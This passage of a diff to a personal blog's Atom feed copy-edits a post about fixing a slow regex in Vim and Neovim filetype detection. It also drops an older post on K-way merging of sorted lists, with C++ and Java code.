+   0.8┤x.x.....x...                                                                          │
+      └┬────────────────────┬─────────────────────┬────────────────────┬────────────────────┬┘
+      1.0                 25.8                  50.5                 75.2               100.0
+seconds                         normalized file size <span class="o">(</span>1 ~<span class="o">=</span> 10k chars<span class="o">)</span>
 
-  </picture>
+</code></pre></div></div>
 
-</figure>
+<p>I spent some time trying to understand why it was written that way. After all, <code class="language-plaintext highlighter-rouge">[0-9:.]* *execve(</code> is equivalent to <code class="language-plaintext highlighter-rouge">execve(</code>, because both <code class="language-plaintext highlighter-rouge">[0-9:.]</code> and the space are matched zero or more times. They do not constrain the match unless the regex is anchored.</p>
 
-<p>I spent some time trying to understand why it was written that way, after all <code class="language-plaintext highlighter-rouge">[0-9:.]* *execve(</code> is equivalent to <code class="language-plaintext highlighter-rouge">execve(</code> given that both <code class="language-plaintext highlighter-rouge">[0-9:.]</code> and <code class="language-plaintext highlighter-rouge">\s</code> are matched zero or more times, so they don’t really matter. This would not have been the case if the regex had been anchored.</p>
+<p>Finally! Something was actually wrong, in Vim too, and it should be fixed.</p>
 
-<p>Finally! Something is actually wrong (in vim too) and should be fixed.</p>
-
-<p>I gave it a shot with the simplified regex. Comparing the time to open up the file before the fix</p>
+<p>I gave it a shot with the simplified regex. Here is the time to open the file before the fix:</p>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ff1d74dcbc84:~# <span class="nb">time </span>nvim /test/data/data/pi_30_000 +qall
 
@@ -196,7 +858,7 @@ user    0m6.123s
 sys     0m0.010s
 </code></pre></div></div>
 
-<p>and after the fix</p>
+<p>and after:</p>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ff1d74dcbc84:~# <span class="nb">time </span><span class="nv">VIMRUNTIME</span><span class="o">=</span>/neovim/runtime/ /neovim/build/bin/nvim /test/data/data/pi_30_000 +qall
 
@@ -204,11 +866,12 @@ real    0m0.021s
 user    0m0.014s
 sys     0m0.000s
 </code></pre></div></div>
-<p>just awesome.</p>
 
-<p>I updated the PR in nvim and opened a PR in vim with the simplified version of the regex. I also noticed that the very same regex had undergone some changes and it also used to be anchored. I think somewhere along the line an edit wasn’t really equivalent, so I added a test to prevent future regressions. You know, just for good measure.</p>
+<p>Much better.</p>
 
-<p>After some <a href="https://github.com/vim/vim/pull/12220">back and forth</a> with @brammool on how to tackle this, I ended up with a fix that eventually got <a href="https://github.com/vim/vim/commit/6e5a9f948221b52caaaf106079cb3430c4dd7c77">accepted</a> into vim codebase and <a href="https://github.com/neovim/neovim/commit/6d9f5b6bf0fc324b33ce01f74a6030c9271b1a01">ported</a> into nvim.</p>
+<p>I updated the nvim PR and opened a Vim PR with the simplified regex. I also noticed that the same regex had changed over time and used to be anchored. I think an edit somewhere along the line was not actually equivalent, so I added a test to prevent future regressions. You know, just for good measure.</p>
+
+<p>After some <a href="https://github.com/vim/vim/pull/12220">back and forth</a> with @brammool on how to tackle this, I ended up with a fix that eventually got <a href="https://github.com/vim/vim/commit/6e5a9f948221b52caaaf106079cb3430c4dd7c77">accepted</a> into the Vim codebase and <a href="https://github.com/neovim/neovim/commit/6d9f5b6bf0fc324b33ce01f74a6030c9271b1a01">ported</a> into nvim.</p>
 
 <div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	 || line4 =~ '^%.\{-}[Vv]irata'
 	 || line5 =~ '^%.\{-}[Vv]irata'
@@ -224,19 +887,19 @@ sys     0m0.000s
 </span>    # VSE JCL
     elseif line1 =~ '^\* $$ JOB\&gt;' || line1 =~ '^// *JOB\&gt;'
 </code></pre></div></div>
-<p>Now that I look at it I think <code class="language-plaintext highlighter-rouge">^[0-9:.]* *execve(</code> was enough to guarantee optimal performances and correctness, but whatever.</p>
+<p>Looking at it now, I think <code class="language-plaintext highlighter-rouge">^[0-9:.]* *execve(</code> would have been enough to guarantee both correctness and good performance, but whatever.</p>
 
-<p>And that folks, is how I made nvim \(6.142 / 0.021 = 292.48 \approx 300\) times faster ;)</p>
+<p>And that, folks, is how I made nvim \(6.142 / 0.021 = 292.48 \approx 300\) times faster.</p>
 
 <h2 id="conclusion">Conclusion</h2>
 
 <p>This was an interesting and fun exercise in troubleshooting.</p>
 
-<p>It made me appreciate open source and hate regex even more! After this was done I started to wonder if a tool to <a href="https://en.wikipedia.org/wiki/NFA_minimization">simplify</a> regexes exists and how <a href="https://cstheory.blogoverflow.com/2011/08/on-learning-regular-languages/">difficult</a> it would be to make one. Maybe I’ll give it a shot.</p>
+<p>It made me appreciate open source and hate regex even more. After this was done, I started to wonder whether a tool to <a href="https://en.wikipedia.org/wiki/NFA_minimization">simplify</a> regexes exists, and how <a href="https://cstheory.blogoverflow.com/2011/08/on-learning-regular-languages/">difficult</a> it would be to make one. Maybe I will give it a shot.</p>
 
-<p>Another interesting way to investigate slow downs in nvim that I found is <a href="https://github.com/stevearc/profile.nvim">this</a> amazing profiling plugin. In case <code class="language-plaintext highlighter-rouge">--startuptime</code> doesn’t give enough or any actionable information.</p>
+<p>Another interesting way to investigate slowdowns in nvim is <a href="https://github.com/stevearc/profile.nvim">this</a> excellent profiling plugin. It is useful when <code class="language-plaintext highlighter-rouge">--startuptime</code> does not give enough actionable information.</p>
 
-<p>For example, this is what it showed for my problem. I added a small <a href="https://github.com/fedemengo/nvim/blob/5edbcf57707a5a987275dad8f1e78f3b13efddc4/fnl/mods/dev/profile.fnl">wrapper</a> to my config and followed the intruction on the repo on how to generate a profile of the startup. And finally inspected the profile with <a href="https://github.com/google/perfetto">perfetto</a>.</p>
+<p>For example, this is what it showed for my problem. I added a small <a href="https://github.com/fedemengo/nvim/blob/5edbcf57707a5a987275dad8f1e78f3b13efddc4/fnl/mods/dev/profile.fnl">wrapper</a> to my config, followed the repository instructions to generate a startup profile, and inspected the result with <a href="https://github.com/google/perfetto">Perfetto</a>.</p>
 
 <figure>
 
@@ -252,7 +915,7 @@ sys     0m0.000s
 
   </picture>
 
-</figure>]]></content><author><name></name></author><category term="debugging" /><category term="vim" /><category term="nvim" /><category term="regex" /><summary type="html"><![CDATA[Tracking down an evil regex in vim and neovim]]></summary></entry><entry><title type="html">Visualizing cellular automata</title><link href="https://fedemengo.github.io/blog/2022/10/visualizing-cellular-automata/" rel="alternate" type="text/html" title="Visualizing cellular automata" /><published>2022-10-28T00:00:00+00:00</published><updated>2022-10-28T00:00:00+00:00</updated><id>https://fedemengo.github.io/blog/2022/10/visualizing-cellular-automata</id><content type="html" xml:base="https://fedemengo.github.io/blog/2022/10/visualizing-cellular-automata/"><![CDATA[<script>
+</figure>]]></content><author><name></name></author><category term="debugging" /><category term="vim" /><category term="nvim" /><category term="regex" /><summary type="html"><![CDATA[Tracking down an evil regex in Vim and Neovim]]></summary></entry><entry><title type="html">Visualizing cellular automata</title><link href="https://fedemengo.github.io/blog/2022/10/visualizing-cellular-automata/" rel="alternate" type="text/html" title="Visualizing cellular automata" /><published>2022-10-28T00:00:00+00:00</published><updated>2022-10-28T00:00:00+00:00</updated><id>https://fedemengo.github.io/blog/2022/10/visualizing-cellular-automata</id><content type="html" xml:base="https://fedemengo.github.io/blog/2022/10/visualizing-cellular-automata/"><![CDATA[<script>
 
 let renderModels = (models, darkTheme) => {
     for(let model of models) {
@@ -1629,123 +2292,4 @@ The value can be listed <code class="language-plaintext highlighter-rouge">V1,V2
 
 <p>To run a command on a hourly/daily/weekly/monthly basis it’s sufficient to place the command in <code class="language-plaintext highlighter-rouge">etc/cron.FREQUENCE/</code></p>
 
-<p>As user administrator it’s possible to specifically allow/deny a user to create <code class="language-plaintext highlighter-rouge">cron</code> and <code class="language-plaintext highlighter-rouge">at</code> jobs by adding the desired username to <code class="language-plaintext highlighter-rouge">etc/cron.deny</code> or <code class="language-plaintext highlighter-rouge">atc/cron.allow</code> (same format for <code class="language-plaintext highlighter-rouge">at</code>)</p>]]></content><author><name></name></author><category term="linux" /><summary type="html"><![CDATA[systemd, at, cron]]></summary></entry><entry><title type="html">K-way merge</title><link href="https://fedemengo.github.io/blog/2018/11/kway-merge/" rel="alternate" type="text/html" title="K-way merge" /><published>2018-11-14T00:00:00+00:00</published><updated>2018-11-14T00:00:00+00:00</updated><id>https://fedemengo.github.io/blog/2018/11/kway-merge</id><content type="html" xml:base="https://fedemengo.github.io/blog/2018/11/kway-merge/"><![CDATA[<p>Given \(K\) sorted arrays (or any sequential container) of size \(N\), merge them into one sorted array.</p>
-
-<h2 id="naive-solution">Naive solution</h2>
-
-<p>A naive solution would require to inspect the first element of all \(K\) array to find the minimum<!--more-->. This process would be repeated for all \(N \cdot K\) values, giving a total complexity of \(O(N\cdot K^2)\)</p>
-
-<h2 id="improved-solution">Improved solution</h2>
-
-<p>Another approach consist of creating the new array with all \(N\cdot K\) value and then sort it, with a running time of \(O((N\cdot K)\log (N\cdot K))\). The problem with this is that we don’t exploit the fact that the arrays are already sorted.</p>
-
-<h2 id="optimal-solution">Optimal solution</h2>
-
-<p>An optimal solution require to quickly find the next element in the sequence among other \(K\) elements. For this reason it’s possible to use a heap of \(K\) elements that “always” stores the first element of each \(K\) arrays. When we remove the minimum value, let’s say from array \(i\), we need to push in the heap the next element from the same array \(i\).</p>
-
-<p>In the following example the algorithm is used to merge \(K\) linked list of size \(N\)</p>
-
-<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="kt">void</span> <span class="nf">kway_merge</span><span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">single_linked</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;&gt;</span> <span class="o">&amp;</span><span class="n">lists</span><span class="p">,</span> <span class="n">single_linked</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">){</span>
-
-    <span class="n">binary_heap</span><span class="o">&lt;</span><span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="o">&gt;</span> <span class="n">max_heap</span><span class="p">([](</span><span class="kt">int</span> <span class="n">k1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">k2</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="n">k1</span> <span class="o">&gt;</span> <span class="n">k2</span><span class="p">;});</span>
-
-    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">lists</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
-        <span class="k">if</span><span class="p">(</span><span class="n">lists</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">size</span><span class="p">()){</span>
-            <span class="n">max_heap</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">lists</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">front</span><span class="p">(),</span> <span class="n">i</span><span class="p">);</span>
-            <span class="n">lists</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">pop_front</span><span class="p">();</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-
-    <span class="c1">// keep a heap with the next lists.size() == K, larger elements</span>
-    <span class="k">while</span><span class="p">(</span><span class="n">max_heap</span><span class="p">.</span><span class="n">size</span><span class="p">()){</span>     <span class="c1">// N * K</span>
-        <span class="k">auto</span> <span class="n">curr_top</span> <span class="o">=</span> <span class="n">max_heap</span><span class="p">.</span><span class="n">top</span><span class="p">();</span>
-        <span class="n">max_heap</span><span class="p">.</span><span class="n">pop</span><span class="p">();</span>                     <span class="c1">// LOG K</span>
-
-        <span class="kt">int</span> <span class="n">val</span> <span class="o">=</span> <span class="n">curr_top</span><span class="p">.</span><span class="n">first</span><span class="p">;</span>
-        <span class="kt">int</span> <span class="n">list_idx</span> <span class="o">=</span> <span class="n">curr_top</span><span class="p">.</span><span class="n">second</span><span class="p">;</span>
-
-        <span class="n">res</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="n">val</span><span class="p">);</span>
-
-        <span class="k">if</span><span class="p">(</span><span class="n">lists</span><span class="p">[</span><span class="n">list_idx</span><span class="p">].</span><span class="n">size</span><span class="p">())</span> <span class="p">{</span>    <span class="c1">// I should add a new element from the next list</span>
-            <span class="n">max_heap</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">lists</span><span class="p">[</span><span class="n">list_idx</span><span class="p">].</span><span class="n">front</span><span class="p">(),</span> <span class="n">list_idx</span><span class="p">);</span>   <span class="c1">// LOG K</span>
-            <span class="n">lists</span><span class="p">[</span><span class="n">list_idx</span><span class="p">].</span><span class="n">pop_front</span><span class="p">();</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-
-    <span class="c1">// Total complexity O(N * K log K)</span>
-
-<span class="p">}</span></code></pre></figure>
-
-<p>This particular implementation of the heap allows to store a <code class="language-plaintext highlighter-rouge">key-value</code> element instead of the classic heap where the value is also the key. The <code class="language-plaintext highlighter-rouge">key</code> represent the actual value of the element and the <code class="language-plaintext highlighter-rouge">value</code> represent the index of the array the item is from.</p>
-
-<p>It’s necessary to fill the heap with the first elements of each array, this operations takes \(\sum\limits_i^K \log i = O(K \log K)\) and then, the while loop it’s going to perform \(N \cdot K\) iteration during which the minimum/maximum value is removed from the heap and new value is pushed, so the time complexity would be \(O(N\cdot K \log K)\).</p>
-
-<p>Overall the total running time is going to be \(O(K \log K) + O(N\cdot K \log K) = O(N\cdot K \log K)\), the main improvement is achieved by keeping only \(K\) values in the heap.</p>
-
-<h2 id="optimal-solution-variant">Optimal solution (variant)</h2>
-
-<p>Another similar solution consists in merging two lists at the time until we end up with just one list, the result. In this case, with the same assumption as before, we are performing \(\dfrac{K}{2}, \dfrac{K}{4}, \dots, 2 = \log_{2}K\) merges of \(N, 2 \cdot N, \dots, 2^{\log_{2}K} \cdot N = K \cdot N\) elements. This solution has the same running time of \(O(N\cdot K \log K)\)</p>
-
-<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="nc">Node</span> <span class="nf">kwayMerge</span><span class="o">(</span><span class="nc">Node</span><span class="o">[]</span> <span class="n">lists</span><span class="o">){</span>
-    <span class="nc">Queue</span><span class="o">&lt;</span><span class="nc">Node</span><span class="o">&gt;</span> <span class="n">q</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">LinkedList</span><span class="o">&lt;&gt;();</span>
-
-    <span class="k">for</span><span class="o">(</span><span class="nc">Node</span> <span class="nl">n:</span> <span class="n">lists</span><span class="o">)</span> <span class="o">{</span>
-        <span class="n">q</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">n</span><span class="o">);</span>
-    <span class="o">}</span>
-
-    <span class="k">while</span><span class="o">(</span><span class="n">q</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">q</span><span class="o">.</span><span class="na">size</span><span class="o">();</span> <span class="n">i</span><span class="o">+=</span><span class="mi">2</span><span class="o">)</span> <span class="o">{</span>
-            <span class="nc">Node</span> <span class="n">x</span> <span class="o">=</span> <span class="n">q</span><span class="o">.</span><span class="na">poll</span><span class="o">();</span>
-            <span class="nc">Node</span> <span class="n">y</span> <span class="o">=</span> <span class="n">q</span><span class="o">.</span><span class="na">poll</span><span class="o">();</span>
-            <span class="nc">Node</span> <span class="n">z</span> <span class="o">=</span> <span class="n">merge</span><span class="o">(</span><span class="n">x</span><span class="o">,</span> <span class="n">y</span><span class="o">);</span>
-            <span class="n">q</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">z</span><span class="o">);</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
-
-    <span class="k">return</span> <span class="n">q</span><span class="o">.</span><span class="na">poll</span><span class="o">();</span>
-<span class="o">}</span></code></pre></figure>
-
-<details>
-<summary><a>Expand</a> merge routine</summary>
-
-
-<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">class</span> <span class="nc">Node</span> <span class="o">{</span>
-    <span class="kt">int</span> <span class="n">val</span><span class="o">;</span>
-    <span class="nc">Node</span> <span class="n">next</span><span class="o">;</span>
-
-    <span class="nc">Node</span><span class="o">(</span><span class="n">v</span><span class="o">)</span> <span class="o">{</span>
-        <span class="n">val</span> <span class="o">=</span> <span class="n">v</span><span class="o">;</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-
-<span class="nc">Node</span> <span class="nf">merge</span><span class="o">(</span><span class="nc">Node</span> <span class="n">l1</span><span class="o">,</span> <span class="nc">Node</span> <span class="n">l2</span><span class="o">)</span> <span class="o">{</span>
-    <span class="k">if</span><span class="o">(</span><span class="n">l1</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
-            <span class="k">return</span> <span class="n">l2</span><span class="o">;</span>
-    <span class="k">if</span><span class="o">(</span><span class="n">l2</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
-        <span class="k">return</span> <span class="n">l1</span><span class="o">;</span>
-
-    <span class="nc">ListNode</span> <span class="n">root</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ListNode</span><span class="o">(-</span><span class="mi">1</span><span class="o">);</span>
-    <span class="nc">ListNode</span> <span class="n">next</span> <span class="o">=</span> <span class="n">root</span><span class="o">;</span>
-
-    <span class="k">while</span><span class="o">(</span><span class="n">l1</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">l2</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">if</span><span class="o">(</span><span class="n">l1</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">l2</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">next</span><span class="o">.</span><span class="na">next</span> <span class="o">=</span> <span class="n">l1</span><span class="o">.</span><span class="na">val</span> <span class="o">&lt;</span> <span class="n">l2</span><span class="o">.</span><span class="na">val</span> <span class="o">?</span> <span class="n">l1</span> <span class="o">:</span> <span class="n">l2</span><span class="o">;</span>
-        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">l1</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">next</span><span class="o">.</span><span class="na">next</span> <span class="o">=</span> <span class="n">l1</span><span class="o">;</span>
-        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
-            <span class="n">next</span><span class="o">.</span><span class="na">next</span> <span class="o">=</span> <span class="n">l2</span><span class="o">;</span>
-        <span class="o">}</span>
-
-        <span class="k">if</span><span class="o">(</span><span class="n">next</span><span class="o">.</span><span class="na">next</span> <span class="o">==</span> <span class="n">l1</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">l1</span> <span class="o">=</span> <span class="n">l1</span><span class="o">.</span><span class="na">next</span><span class="o">;</span>
-        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
-            <span class="n">l2</span> <span class="o">=</span> <span class="n">l2</span><span class="o">.</span><span class="na">next</span><span class="o">;</span>
-        <span class="o">}</span>
-
-        <span class="n">next</span> <span class="o">=</span> <span class="n">next</span><span class="o">.</span><span class="na">next</span><span class="o">;</span>
-    <span class="o">}</span>
-
-    <span class="k">return</span> <span class="n">root</span><span class="o">.</span><span class="na">next</span><span class="o">;</span>
-<span class="o">}</span></code></pre></figure>
-
-</details>]]></content><author><name></name></author><category term="puzzle" /><category term="cpp" /><category term="java" /><summary type="html"><![CDATA[Merge K sorted container]]></summary></entry></feed>
+<p>As user administrator it’s possible to specifically allow/deny a user to create <code class="language-plaintext highlighter-rouge">cron</code> and <code class="language-plaintext highlighter-rouge">at</code> jobs by adding the desired username to <code class="language-plaintext highlighter-rouge">etc/cron.deny</code> or <code class="language-plaintext highlighter-rouge">atc/cron.allow</code> (same format for <code class="language-plaintext highlighter-rouge">at</code>)</p>]]></content><author><name></name></author><category term="linux" /><summary type="html"><![CDATA[systemd, at, cron]]></summary></entry></feed>
